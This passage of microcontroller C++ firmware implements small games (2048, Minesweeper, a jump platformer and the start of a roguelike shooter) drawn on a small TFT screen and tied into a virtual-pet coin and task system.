  if (n == 0) return; int r = random(n); g2Grid[empty[r][1]][empty[r][0]] = (random(10) < 9) ? 2 : 4; }
void g2Init() { for (int y=0;y<4;y++) for (int x=0;x<4;x++) g2Grid[y][x]=0; g2Score=0; g2Spawn(); g2Spawn(); }
bool g2Move(int dir) { bool moved = false;
  if (dir==0) { for(int x=0;x<4;x++) for(int y=0;y<4;y++) for(int yy=y+1;yy<4;yy++){if(g2Grid[yy][x]==0)continue;if(g2Grid[y][x]==0){g2Grid[y][x]=g2Grid[yy][x];g2Grid[yy][x]=0;moved=true;}else if(g2Grid[y][x]==g2Grid[yy][x]){g2Grid[y][x]*=2;g2Score+=g2Grid[y][x];g2Grid[yy][x]=0;moved=true;}break;} }
  else if (dir==1) { for(int x=0;x<4;x++) for(int y=3;y>=0;y--) for(int yy=y-1;yy>=0;yy--){if(g2Grid[yy][x]==0)continue;if(g2Grid[y][x]==0){g2Grid[y][x]=g2Grid[yy][x];g2Grid[yy][x]=0;moved=true;}else if(g2Grid[y][x]==g2Grid[yy][x]){g2Grid[y][x]*=2;g2Score+=g2Grid[y][x];g2Grid[yy][x]=0;moved=true;}break;} }
  else if (dir==2) { for(int y=0;y<4;y++) for(int x=0;x<4;x++) for(int xx=x+1;xx<4;xx++){if(g2Grid[y][xx]==0)continue;if(g2Grid[y][x]==0){g2Grid[y][x]=g2Grid[y][xx];g2Grid[y][xx]=0;moved=true;}else if(g2Grid[y][x]==g2Grid[y][xx]){g2Grid[y][x]*=2;g2Score+=g2Grid[y][x];g2Grid[y][xx]=0;moved=true;}break;} }
  else { for(int y=0;y<4;y++) for(int x=3;x>=0;x--) for(int xx=x-1;xx>=0;xx--){if(g2Grid[y][xx]==0)continue;if(g2Grid[y][x]==0){g2Grid[y][x]=g2Grid[y][xx];g2Grid[y][xx]=0;moved=true;}else if(g2Grid[y][x]==g2Grid[y][xx]){g2Grid[y][x]*=2;g2Score+=g2Grid[y][x];g2Grid[y][xx]=0;moved=true;}break;} }
  return moved; }
uint16_t g2TileColor(int v) { switch(v){case 0:return 0x2104;case 2:return 0x8410;case 4:return 0xC618;case 8:return 0xFDA0;case 16:return 0xFB00;case 32:return 0xF800;case 64:return 0xF81F;case 128:return 0x07E0;case 256:return 0x07FF;case 512:return 0xFFE0;case 1024:return 0x07FF;case 2048:return 0xFFE0;default:return 0xFFFF;} }
void g2Draw() { tft.fillScreen(TFT_BLACK); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("2048  S:" + String(g2Score), 2, 0);
  int cellW = 34, cellH = 14, ox = 12, oy = 14;
  for (int y=0;y<4;y++) for (int x=0;x<4;x++) { int px = ox + x*cellW, py = oy + y*cellH; uint16_t c = g2TileColor(g2Grid[y][x]);
    tft.fillRoundRect(px, py, cellW-2, cellH-2, 2, c);
    if (g2Grid[y][x] > 0) { tft.setTextColor(TFT_BLACK, c); char b[8]; snprintf(b, sizeof(b), "%d", g2Grid[y][x]); tft.drawCentreString(b, px + cellW/2 - 1, py + 3, 1); } } }
bool g2CanMove() { for (int y=0;y<4;y++) for (int x=0;x<4;x++) { if (g2Grid[y][x]==0) return true; if (x<3 && g2Grid[y][x]==g2Grid[y][x+1]) return true; if (y<3 && g2Grid[y][x]==g2Grid[y+1][x]) return true; } return false; }
char g2GetKey() {
  static unsigned long lastRight=0;
  if (digitalRead(BTN_UP)==LOW){delay(20);if(digitalRead(BTN_UP)==LOW){while(digitalRead(BTN_UP)==LOW)delay(5);return 'L';}}
  if (digitalRead(BTN_DOWN)==LOW){delay(20);if(digitalRead(BTN_DOWN)==LOW){while(digitalRead(BTN_DOWN)==LOW)delay(5);return 'R';}}
  if (digitalRead(BTN_LEFT)==LOW){delay(20);if(digitalRead(BTN_LEFT)==LOW){while(digitalRead(BTN_LEFT)==LOW)delay(5);return 'U';}}
  if (digitalRead(BTN_RIGHT)==LOW) {
    delay(20);
    if (digitalRead(BTN_RIGHT)==LOW) {
      while (digitalRead(BTN_RIGHT)==LOW) delay(5);
      unsigned long now=millis();
      if (lastRight>0 && now-lastRight<400) { lastRight=0; return 'E'; }
      lastRight=now;
      return 'D';
    }
  }
  return 0;
}
void g2GamePlay() { g2Init(); g2Draw();
  while (true) { char k = g2GetKey();
    if (k == 'E') { if (g2Score > g2Data.bestScore) g2Data.bestScore = g2Score; g2Save(); if (g2Score > 0) gameReward(g2Score / 50 + 2); pet2TaskAdd(6, 1); g2Score = 0; for(int y=0;y<4;y++)for(int x=0;x<4;x++)g2Grid[y][x]=0; return; }
    bool moved = false;
    if (k == 'U') moved = g2Move(0);
    else if (k == 'D') moved = g2Move(1);
    else if (k == 'L') moved = g2Move(2);
    else if (k == 'R') moved = g2Move(3);
    if (moved) { g2Spawn(); g2Draw();
      if (!g2CanMove()) { if (g2Score > g2Data.bestScore) g2Data.bestScore = g2Score;
        g2Save(); gameReward(g2Score / 50 + 3); pet2TaskAdd(6, 1); pet2TaskSet(7, g2Score);
        clearAll(); tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawCentreString("GAME OVER", 80, 20, 1);
        tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Score: " + String(g2Score), 4, 40);
        while (true) { char kk = getKey(); if (kk == 'E') break; delay(20); }
        g2Score = 0; for(int y=0;y<4;y++)for(int x=0;x<4;x++)g2Grid[y][x]=0; return; } }
    delay(20); } }
void g2ShowRecords() { clearAll(); tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Best Score:", 4, 30); tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(g2Data.bestScore), 4, 44); waitExit(); }
void show2048() { deinitWifi(); deinitBLE(); g2Load();
  int menuSel = 0; bool inMenu = true;
  while (inMenu) { clearAll(); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("2048", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[] = {"Start", "Records"};
    for (int i=0;i<2;i++) tft.drawString(((i==menuSel)?"> ":"  ") + String(items[i]), 2, 20 + i*14);
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + 1) % 2; else if (k == 'D') menuSel = (menuSel + 1) % 2;
    else if (k == 'L') { if (menuSel == 0) g2GamePlay(); else if (menuSel == 1) g2ShowRecords(); g2Load(); }
    else if (k == 'R' || k == 'E') inMenu = false;
    delay(30); } }

// ==================================================
// ============== Minesweeper ==============
// ==================================================
int minGrid[9][9]; bool minRevealed[9][9]; bool minFlag[9][9];
int minCursorX = 0, minCursorY = 0;
unsigned long minStartTime = 0; bool minFirst = true;
const uint8_t digit3x5[9][5] = {
  {0b111,0b101,0b101,0b101,0b111},{0b010,0b110,0b010,0b010,0b111},{0b111,0b001,0b111,0b100,0b111},
  {0b111,0b001,0b111,0b001,0b111},{0b101,0b101,0b111,0b001,0b001},{0b111,0b100,0b111,0b001,0b111},
  {0b111,0b100,0b111,0b101,0b111},{0b111,0b001,0b010,0b010,0b010},{0b111,0b101,0b111,0b101,0b111}
};
void drawDigit3x5(int x, int y, int digit, uint16_t color) { if (digit<0||digit>8) return; for (int row=0;row<5;row++){uint8_t bits=digit3x5[digit][row];for(int col=0;col<3;col++)if(bits&(0b100>>col))tft.drawPixel(x+col,y+row,color);} }
void minGenerate(int sx, int sy) { for(int y=0;y<9;y++)for(int x=0;x<9;x++){minGrid[y][x]=0;minRevealed[y][x]=false;minFlag[y][x]=false;}
  int placed=0; while(placed<45){int x=random(9),y=random(9);if(minGrid[y][x]==-1)continue;if(abs(x-sx)<=1&&abs(y-sy)<=1)continue;minGrid[y][x]=-1;placed++;}
  for(int y=0;y<9;y++)for(int x=0;x<9;x++){if(minGrid[y][x]==-1)continue;int c=0;for(int dy=-1;dy<=1;dy++)for(int dx=-1;dx<=1;dx++){int nx=x+dx,ny=y+dy;if(nx<0||nx>=9||ny<0||ny>=9)continue;if(minGrid[ny][nx]==-1)c++;}minGrid[y][x]=c;} }
void minRevealFlood(int x, int y) { if(x<0||x>=9||y<0||y>=9)return;if(minRevealed[y][x]||minFlag[y][x])return;minRevealed[y][x]=true;if(minGrid[y][x]==0)for(int dy=-1;dy<=1;dy++)for(int dx=-1;dx<=1;dx++)minRevealFlood(x+dx,y+dy); }
void minDraw() { tft.fillScreen(TFT_BLACK); tft.setTextColor(TFT_WHITE, TFT_BLACK);
  int remaining=0; for(int y=0;y<9;y++)for(int x=0;x<9;x++)if(minGrid[y][x]==-1&&!minFlag[y][x])remaining++;
  char info[24]; snprintf(info,sizeof(info),"M:%d T:%lu",remaining,(millis()-minStartTime)/1000); tft.drawString(info,2,0);
  int cellW=13, cellH=6, ox=(160-9*cellW)/2;
  for(int y=0;y<9;y++)for(int x=0;x<9;x++){int px=ox+x*cellW,py=22+y*cellH;
    if(minRevealed[y][x]){tft.fillRect(px,py,cellW-1,cellH-1,0x0000);if(minGrid[y][x]==-1)tft.fillRect(px+3,py+1,5,4,TFT_RED);else if(minGrid[y][x]>0){uint16_t col;switch(minGrid[y][x]){case 1:col=TFT_BLUE;break;case 2:col=TFT_GREEN;break;case 3:col=TFT_RED;break;case 4:col=TFT_MAGENTA;break;case 5:col=TFT_ORANGE;break;case 6:col=TFT_CYAN;break;default:col=TFT_YELLOW;break;}drawDigit3x5(px+(cellW-3)/2,py+1,minGrid[y][x],col);}}
    else if(minFlag[y][x]){tft.fillRect(px,py,cellW-1,cellH-1,TFT_RED);tft.drawLine(px+2,py+1,px+2,py+5,TFT_WHITE);tft.fillTriangle(px+2,py+1,px+7,py+2,px+2,py+4,TFT_YELLOW);}
    else tft.fillRect(px,py,cellW-1,cellH-1,0x8410);
    if(x==minCursorX&&y==minCursorY)tft.drawRect(px-1,py-1,cellW+1,cellH+1,TFT_YELLOW);} }
void minGamePlay() { minFirst=true;minStartTime=millis();minCursorX=0;minCursorY=0;
  for(int y=0;y<9;y++)for(int x=0;x<9;x++){minGrid[y][x]=0;minRevealed[y][x]=false;minFlag[y][x]=false;}
  minDraw();
  while (true) { char k = getGameKey();
    if (k == 'E') { pet2TaskAdd(6,1); return; }
    if (k == 'U') {
      minCursorX--;
      if (minCursorX < 0) { minCursorX = 8; if (minCursorY > 0) minCursorY--; else minCursorY = 8; }
    }
    else if (k == 'D') { minCursorX++; if (minCursorX>8) { minCursorX=0; minCursorY++; if (minCursorY>8) minCursorY=0; } }
    else if (k == 'L') { if (minFirst) { minGenerate(minCursorX, minCursorY); minFirst=false; } if (!minFlag[minCursorY][minCursorX]) minRevealFlood(minCursorX, minCursorY); }
    else if (k == 'R') minFlag[minCursorY][minCursorX] = !minFlag[minCursorY][minCursorX];
    bool win = true;
    for (int y=0;y<9;y++) for (int x=0;x<9;x++) { if (minGrid[y][x]==-1) continue; if (!minRevealed[y][x]) { win=false; break; } }
    if (win) { uint16_t t = (millis()-minStartTime)/1000; if (minData.bestTime==0||t<minData.bestTime) minData.bestTime=t; minSave(); gameReward(15); pet2TaskAdd(6,1);
      clearAll(); tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawCentreString("WIN!", 80, 20, 1);
      tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Time: " + String(t) + "s", 4, 40);
      while (true) { char kk = getKey(); if (kk == 'E') break; delay(20); } return; }
    if (minRevealed[minCursorY][minCursorX] && minGrid[minCursorY][minCursorX]==-1) {
      clearAll(); tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawCentreString("BOOM!", 80, 20, 1);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      while (true) { char kk = getKey(); if (kk == 'E') break; delay(20); } return; }
    minDraw(); delay(30); } }
void minShowRecords() { clearAll(); tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Best Time:", 4, 30); tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(minData.bestTime) + "s", 4, 44); waitExit(); }
void showMinesweeper() { deinitWifi(); deinitBLE(); minLoad();
  int menuSel = 0; bool inMenu = true;
  while (inMenu) { clearAll(); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Minesweeper", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[] = {"Start", "Records"};
    for (int i=0;i<2;i++) tft.drawString(((i==menuSel)?"> ":"  ") + String(items[i]), 2, 20 + i*14);
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + 1) % 2; else if (k == 'D') menuSel = (menuSel + 1) % 2;
    else if (k == 'L') { if (menuSel == 0) minGamePlay(); else if (menuSel == 1) minShowRecords(); minLoad(); }
    else if (k == 'R' || k == 'E') inMenu = false;
    delay(30); } }

// ==================================================
// ============== Jump ==============
// ==================================================
#define JMP_SCREEN_X 30
#define JMP_GROUND_Y 56
#define JMP_MAX_CHARGE 18
#define JMP_MAX_PLATS 3
#define JMP_CHARGE_PERIOD 20
#define JMP_BASE_VX 0.3f
#define JMP_VX_PER_CHARGE 0.11f
#define JMP_JUMP_VY -3.0f
#define JMP_GRAVITY 0.25f
struct JmpPlat { int worldX; int w; bool active; int hitFlash; };
JmpPlat jmpPlats[JMP_MAX_PLATS];
float jmpPlayerWorldX=0, jmpPlayerY=0, jmpPlayerVX=0, jmpPlayerVY=0, jmpCameraX=0, jmpCameraTarget=0;
bool jmpCameraMoving=false, jmpCharging=false, jmpJumping=false;
int jmpCharge=0, jmpScore=0, jmpOriginPlatIdx=0;
const uint16_t JMP_PLAT_TOP[5] = {0x07FF,0x07E0,0xFFE0,0xFD20,0xF800};
const uint16_t JMP_PLAT_SIDE[5] = {0x001F,0x0400,0x8400,0x8000,0x8000};
int jmpToScreenX(float wx) { return (int)(wx - jmpCameraX); }
void jmpStartCameraMove() { jmpCameraTarget = jmpPlayerWorldX - JMP_SCREEN_X; jmpCameraMoving = true; }
void jmpSnapCamera() { jmpCameraX = jmpPlayerWorldX - JMP_SCREEN_X; jmpCameraTarget = jmpCameraX; jmpCameraMoving = false; }
int jmpGetLvl() { int lvl = 1 + jmpScore/5; if (lvl>40) lvl=40; return lvl; }
int jmpPlatW() { int lvl = jmpGetLvl(); int w = 22-(lvl-1); if (w<8) w=8; return w; }
int jmpPlatGap() { int lvl=jmpGetLvl(); int minGap=14; int maxGap=22+lvl/2; if (maxGap>32) maxGap=32; return random(minGap, maxGap+1); }
void jmpDrawPlayer(int x, int y, int pose, int charge) {
  uint16_t bc = TFT_YELLOW;
  if (pose==0) { tft.fillCircle(x+2,y,2,bc); tft.fillRect(x,y+2,5,4,bc); tft.drawPixel(x+1,y,TFT_BLACK); tft.drawPixel(x+3,y,TFT_BLACK); tft.fillRect(x,y+6,2,2,bc); tft.fillRect(x+3,y+6,2,2,bc); }
  else if (pose==1) { int comp=charge/7; if(comp>3)comp=3; tft.fillCircle(x+2,y+comp,2,bc); tft.fillRect(x,y+comp+2,5,4-comp,bc); tft.fillRect(x,y+6,2,2,bc); tft.fillRect(x+3,y+6,2,2,bc); }
  else { int rot=pose-2; if(rot==0){tft.fillRect(x,y,5,8,bc);tft.drawPixel(x+1,y+2,TFT_BLACK);tft.drawPixel(x+3,y+2,TFT_BLACK);}else if(rot==1){tft.fillRect(x-1,y+2,7,4,bc);tft.drawPixel(x+1,y+3,TFT_BLACK);tft.drawPixel(x+1,y+5,TFT_BLACK);}else if(rot==2){tft.fillRect(x,y,5,8,bc);tft.drawPixel(x+1,y+6,TFT_BLACK);tft.drawPixel(x+3,y+6,TFT_BLACK);}else{tft.fillRect(x-1,y+2,7,4,bc);tft.drawPixel(x+5,y+3,TFT_BLACK);tft.drawPixel(x+5,y+5,TFT_BLACK);} } }
void jmpSpawnNextPlat() { int rightEdge=0; for(int i=JMP_MAX_PLATS-1;i>=0;i--)if(jmpPlats[i].active){rightEdge=jmpPlats[i].worldX+jmpPlats[i].w;break;}
  for(int i=0;i<JMP_MAX_PLATS;i++)if(!jmpPlats[i].active){jmpPlats[i].worldX=rightEdge+jmpPlatGap();jmpPlats[i].w=jmpPlatW();jmpPlats[i].active=true;jmpPlats[i].hitFlash=0;break;} }
void jmpResetPlats() { for(int i=0;i<JMP_MAX_PLATS;i++){jmpPlats[i].active=false;jmpPlats[i].hitFlash=0;}jmpPlats[0].worldX=0;jmpPlats[0].w=22;jmpPlats[0].active=true;jmpSpawnNextPlat();jmpSpawnNextPlat(); }
void jmpDrawAll(unsigned long now, int pose) { tft.fillRect(0,10,160,70,TFT_BLACK); tft.fillRect(0,10,160,46,0x0010);
  for(int i=0;i<5;i++)tft.drawFastHLine(0,10+i*4,160,0x0020);
  for(int i=0;i<4;i++){int px=20+i*35;int py=14+(i%3)*5;int phase=(now/300+i*200)%600;uint16_t c=(phase<300)?TFT_WHITE:0x8410;tft.drawPixel(px,py,c);}
  int colorIdx=jmpScore/10; if(colorIdx>4)colorIdx=4;
  for(int i=0;i<JMP_MAX_PLATS;i++){if(!jmpPlats[i].active)continue;int sx=jmpToScreenX(jmpPlats[i].worldX);if(sx+jmpPlats[i].w<0||sx>160)continue;bool flash=jmpPlats[i].hitFlash>0;uint16_t tc=flash?TFT_WHITE:JMP_PLAT_TOP[colorIdx];uint16_t sc=JMP_PLAT_SIDE[colorIdx];
    tft.fillRect(sx,JMP_GROUND_Y,jmpPlats[i].w,3,tc);tft.fillRect(sx,JMP_GROUND_Y+3,jmpPlats[i].w,2,sc);tft.drawFastHLine(sx,JMP_GROUND_Y,jmpPlats[i].w,TFT_WHITE);tft.drawFastHLine(sx,JMP_GROUND_Y+4,jmpPlats[i].w,TFT_BLACK);}
  int psx=jmpToScreenX(jmpPlayerWorldX); jmpDrawPlayer(psx-2,(int)jmpPlayerY,pose,jmpCharge);
  tft.fillRect(0,0,160,10,TFT_BLACK); tft.setTextColor(TFT_WHITE, TFT_BLACK);
  char buf[20]; snprintf(buf,sizeof(buf),"S:%d",jmpScore); tft.drawString(buf,2,0);
  snprintf(buf,sizeof(buf),"B:%d",jmpData.bestScore); tft.drawString(buf,58,0);
  snprintf(buf,sizeof(buf),"Lv:%d",jmpGetLvl()); tft.drawString(buf,125,0);
  tft.drawRect(4,66,152,10,TFT_WHITE); int fillW=jmpCharge*148/JMP_MAX_CHARGE; if(fillW>148)fillW=148;
  uint16_t bc2=(jmpCharge<6)?TFT_GREEN:(jmpCharge<13?TFT_YELLOW:TFT_RED); if(fillW>0){tft.fillRect(6,68,fillW,6,bc2);tft.drawFastHLine(6,68,fillW,TFT_WHITE);} }
void jmpGamePlay() { jmpScore=0;jmpCharge=0;jmpCharging=false;jmpJumping=false;jmpPlayerY=JMP_GROUND_Y-8;
  jmpResetPlats(); jmpPlayerWorldX=jmpPlats[0].worldX+jmpPlats[0].w/2.0f; jmpSnapCamera();
  unsigned long lastFrame=millis(), lastCharge=millis(), maxChargeTime=0;
  while (true) { unsigned long now=millis(); if(now-lastFrame<20){delay(5);continue;} lastFrame=now;
    bool upHeld=(digitalRead(BTN_UP)==LOW);
    char k=getGameKey();
    if (k=='E') { if(jmpScore>jmpData.bestScore)jmpData.bestScore=jmpScore; jmpSave(); if(jmpScore>0)gameReward(jmpScore/2+1); pet2TaskAdd(6,1); jmpScore=0;jmpCharge=0;jmpCharging=false;jmpJumping=false; return; }
    if (jmpCameraMoving){float diff=jmpCameraTarget-jmpCameraX;if(fabsf(diff)<2.0f){jmpCameraX=jmpCameraTarget;jmpCameraMoving=false;}else jmpCameraX+=diff*0.12f;}
    if (!jmpJumping && !jmpCameraMoving) { if (upHeld) { if(!jmpCharging){jmpCharging=true;jmpCharge=0;lastCharge=now;maxChargeTime=0;}
        if(jmpCharge>=JMP_MAX_CHARGE){if(maxChargeTime==0)maxChargeTime=now;else if(now-maxChargeTime>=500){jmpCharge=0;maxChargeTime=now;lastCharge=now;}}
        else if(now-lastCharge>JMP_CHARGE_PERIOD){lastCharge=now;jmpCharge++;}
      } else if(jmpCharging){jmpCharging=false;jmpJumping=true;
        if(jmpCharge<5)jmpPlayerVX=JMP_BASE_VX;else jmpPlayerVX=JMP_BASE_VX+jmpCharge*JMP_VX_PER_CHARGE;
        jmpPlayerVY=JMP_JUMP_VY;jmpCharge=0;jmpOriginPlatIdx=-1;
        for(int i=0;i<JMP_MAX_PLATS;i++){if(!jmpPlats[i].active)continue;if(jmpPlayerWorldX>=jmpPlats[i].worldX&&jmpPlayerWorldX<=jmpPlats[i].worldX+jmpPlats[i].w){jmpOriginPlatIdx=i;break;}}} }
    int pose=0;
    if (jmpJumping) { jmpPlayerWorldX+=jmpPlayerVX; jmpPlayerY+=jmpPlayerVY; jmpPlayerVY+=JMP_GRAVITY;
      if (jmpPlayerY>=JMP_GROUND_Y-8 && jmpPlayerVY>0) { jmpPlayerY=JMP_GROUND_Y-8; jmpJumping=false;
        int hitPlat=-1;
        for(int i=0;i<JMP_MAX_PLATS;i++){if(!jmpPlats[i].active)continue;if(jmpPlayerWorldX>=jmpPlats[i].worldX&&jmpPlayerWorldX<=jmpPlats[i].worldX+jmpPlats[i].w){hitPlat=i;break;}}
        if (hitPlat<0) { for(int f=0;f<10;f++){jmpPlayerY+=2;jmpDrawAll(now,0);delay(30);}
          if(jmpScore>jmpData.bestScore)jmpData.bestScore=jmpScore;jmpSave();gameReward(jmpScore/2+2);pet2TaskAdd(6,1);pet2TaskSet(7,jmpScore);
          clearAll();tft.setTextColor(TFT_RED,TFT_BLACK);tft.drawCentreString("GAME OVER",80,15,1);tft.setTextColor(TFT_WHITE,TFT_BLACK);tft.drawString("Score: "+String(jmpScore),4,35);
          while(true){char kk=getKey();if(kk=='R'||kk=='E')break;delay(20);}
          jmpScore=0;jmpCharge=0;jmpCharging=false;jmpJumping=false;return; }
        if (hitPlat>jmpOriginPlatIdx && jmpOriginPlatIdx>=0){int gained=hitPlat-jmpOriginPlatIdx;jmpScore+=gained;for(int i=0;i<JMP_MAX_PLATS-1;i++)jmpPlats[i]=jmpPlats[i+1];jmpPlats[JMP_MAX_PLATS-1].active=false;jmpSpawnNextPlat();}
        jmpPlayerY=JMP_GROUND_Y-8; if(hitPlat<JMP_MAX_PLATS)jmpPlats[hitPlat].hitFlash=6; jmpStartCameraMove();
      } else { int rotFrame=(int)((millis()/50)%4); pose=2+rotFrame; } } else pose=jmpCharging?1:0;
    for(int i=0;i<JMP_MAX_PLATS;i++)if(jmpPlats[i].hitFlash>0)jmpPlats[i].hitFlash--;
    jmpDrawAll(now,pose); } }
void jmpShowRecords() { clearAll(); tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Best Score:", 4, 30); tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(jmpData.bestScore), 4, 44); waitExit(); }
void showJump() { deinitWifi(); deinitBLE(); jmpLoad();
  int menuSel=0; bool inMenu=true;
  while (inMenu) { clearAll(); tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Jump", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[] = {"Start", "Records"};
    for(int i=0;i<2;i++)tft.drawString(((i==menuSel)?"> ":"  ") + String(items[i]),2,20+i*14);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("Hold UP to charge", 2, 60);
    char k = getKey();
    if(k=='U')menuSel=(menuSel+1)%2;else if(k=='D')menuSel=(menuSel+1)%2;
    else if(k=='L'){if(menuSel==0)jmpGamePlay();else if(menuSel==1)jmpShowRecords();jmpLoad();}
    else if(k=='R'||k=='E')inMenu=false;
    delay(30); } }

// ==================================================
// ============== Roguelike（★ 15 种子弹 + 2% 特殊砖块 + 20 级下落封顶 + 速度 +1%）
// ==================================================
struct RogBrick { int x; int y; int hp; uint8_t kind; int slowFx; bool active; };
RogBrick rogBricks[24];
int rogBrickCount = 0;
int rogLevel = 1, rogExp = 0, rogScore = 0;
int rogDamage = 1, rogFireRate = 600, rogBulletCount = 1, rogBulletSpeed = 3, rogPierce = 0;
int rogMultiShot = 0, rogCrit = 0, rogLifeSteal = 0;
int rogCannonX = 74;
unsigned long rogStartTime = 0, rogLastSpawn = 0, rogLastMove = 0, rogLastShoot = 0;
int rogMoveInterval = 1000;
int rogLastDmgLv = 0, rogLastFireLv = 0;
const int ROG_BULLET_SPEED_MAX = 30;
const unsigned long ROG_SPAWN_MS = 3465;

enum RogBulletType {
  RB_NORMAL, RB_SPREAD, RB_LASER, RB_PIERCE, RB_EXPLOSIVE,
  RB_FROST, RB_POISON, RB_HOLY, RB_VOID, RB_COSMIC,
  RB_THUNDER, RB_QUANTUM, RB_PLASMA, RB_SINGULARITY, RB_DRAGON
};
uint8_t rogTierFromSpeed(int spd) {
  if (spd <= 3)  return RB_NORMAL;
  if (spd <= 5)  return RB_SPREAD;
  if (spd <= 7)  return RB_LASER;
  if (spd <= 9)  return RB_PIERCE;
  if (spd <= 11) return RB_EXPLOSIVE;
  if (spd <= 13) return RB_FROST;
  if (spd <= 15) return RB_POISON;
  if (spd <= 17) return RB_HOLY;
  if (spd <= 19) return RB_VOID;
  if (spd <= 21) return RB_COSMIC;
  if (spd <= 23) return RB_THUNDER;
  if (spd <= 25) return RB_QUANTUM;
  if (spd <= 27) return RB_PLASMA;
  if (spd <= 29) return RB_SINGULARITY;
  return RB_DRAGON;
}
#define ROG_MAX_FX 20
struct RogFx { int x, y, life; uint8_t tier; };
RogFx rogFx[ROG_MAX_FX];
int rogFxCount = 0;
void rogAddHitFx(int x, int y, uint8_t tier) {
  if (rogFxCount < ROG_MAX_FX) {
    rogFx[rogFxCount].x = x; rogFx[rogFxCount].y = y;
    rogFx[rogFxCount].life = 8; rogFx[rogFxCount].tier = tier;
    rogFxCount++;
  }
}
void rogUpdateFx() {
  int n = 0;
  for (int i = 0; i < rogFxCount; i++) {
    rogFx[i].life--;
    if (rogFx[i].life > 0) { if (n != i) rogFx[n] = rogFx[i]; n++; }
  }
  rogFxCount = n;
}
static inline void rogClipPixel(int x, int y, uint16_t c, int clipY) {
  if (y >= clipY && x >= 0 && x < 160) tft.drawPixel(x, y, c);
}
static void rogClipLine(int x0, int y0, int x1, int y1, uint16_t c, int clipY) {
  int dx = abs(x1 - x0), sx = x0 < x1 ? 1 : -1;
  int dy = -abs(y1 - y0), sy = y0 < y1 ? 1 : -1;
  int err = dx + dy;
  while (true) {
    rogClipPixel(x0, y0, c, clipY);
    if (x0 == x1 && y0 == y1) break;
    int e2 = 2 * err;
    if (e2 >= dy) { err += dy; x0 += sx; }
    if (e2 <= dx) { err += dx; y0 += sy; }
  }
}
static void rogClipCircle(int cx, int cy, int r, uint16_t c, int clipY) {
  if (r <= 0) return;
  for (int dy = -r; dy <= r; dy++) {
    int y = cy + dy; if (y < clipY) continue;
    int dx2 = r * r - dy * dy; if (dx2 < 0) continue;
    int dx = (int)sqrtf((float)dx2);
    tft.drawPixel(cx - dx, y, c);
    tft.drawPixel(cx + dx, y, c);
  }
}
static void rogClipFillCircle(int cx, int cy, int r, uint16_t c, int clipY) {
  if (r <= 0) return;
  for (int dy = -r; dy <= r; dy++) {
    int y = cy + dy; if (y < clipY) continue;
    int dx2 = r * r - dy * dy; if (dx2 < 0) continue;
    int dx = (int)sqrtf((float)dx2);
    tft.drawFastHLine(cx - dx, y, 2 * dx + 1, c);
  }
}
void rogDrawFx() {
  const int CLIP_Y = 13;
  for (int i = 0; i < rogFxCount; i++) {
    RogFx* fx = &rogFx[i];
    int age = 8 - fx->life;
    int cx = fx->x, cy = fx->y;
    int r  = 1 + age;
    switch (fx->tier) {
      case RB_NORMAL: { rogClipCircle(cx, cy, r, TFT_YELLOW, CLIP_Y); if (age < 3) rogClipFillCircle(cx, cy, 1, TFT_WHITE, CLIP_Y); break; }
      case RB_SPREAD: { uint16_t c = (age < 4) ? TFT_ORANGE : TFT_YELLOW;
        for (int a = 0; a < 8; a++) { float rad = a * 45.0f * 3.14159f / 180.0f;
          int ex = cx + (int)(cosf(rad) * r); int ey = cy + (int)(sinf(rad) * r);
          rogClipLine(cx, cy, ex, ey, c, CLIP_Y); } break; }
      case RB_LASER: { int len = 2 + age * 2;
        rogClipLine(cx - len, cy, cx + len, cy, TFT_CYAN, CLIP_Y);
        rogClipLine(cx, cy - len, cx, cy + len, TFT_WHITE, CLIP_Y); break; }
      case RB_PIERCE: { int s = 2 + age;
        rogClipLine(cx - s, cy - s, cx + s, cy + s, TFT_GREEN, CLIP_Y);
        rogClipLine(cx - s, cy + s, cx + s, cy - s, TFT_GREEN, CLIP_Y);
        if (age < 3) rogClipFillCircle(cx, cy, 1, TFT_WHITE, CLIP_Y); break; }
      case RB_EXPLOSIVE: { if (age < 2) rogClipFillCircle(cx, cy, 3, TFT_WHITE, CLIP_Y);
        rogClipCircle(cx, cy, r + 1, TFT_ORANGE, CLIP_Y); rogClipCircle(cx, cy, r + 3, TFT_RED, CLIP_Y);
        if (age < 5) for (int a = 0; a < 6; a++) { float rad = (a * 60 + age * 15) * 3.14159f / 180.0f;
          int px = cx + (int)(cosf(rad) * (r + 2)); int py = cy + (int)(sinf(rad) * (r + 2));
          rogClipPixel(px, py, TFT_YELLOW, CLIP_Y); } break; }
      case RB_FROST: { int len = 2 + age;
        for (int a = 0; a < 6; a++) { float rad = a * 60.0f * 3.14159f / 180.0f;
